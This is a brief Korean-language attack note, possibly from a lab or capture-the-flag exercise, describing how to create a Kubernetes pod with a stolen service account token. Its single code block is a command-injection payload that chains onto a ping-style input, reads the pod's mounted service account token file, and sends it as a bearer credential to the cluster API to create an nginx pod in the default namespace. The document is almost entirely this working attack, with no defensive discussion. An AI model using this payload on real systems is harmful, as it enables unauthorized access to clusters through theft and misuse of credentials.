# 공격 시나리오
* serviceAccount 토큰을 사용하여 쿠버네티스 pod 생성


# 공격 방법

* default namespace에 nginx pod를 생성

```sh
127.0.0.1 -c 1 && cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"nginx","namespace":"default"},"spec":{"containers":[{"name":"nginx","image":"nginx:latest","ports":[{"containerPort":80}]}]}}' https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods; }
```
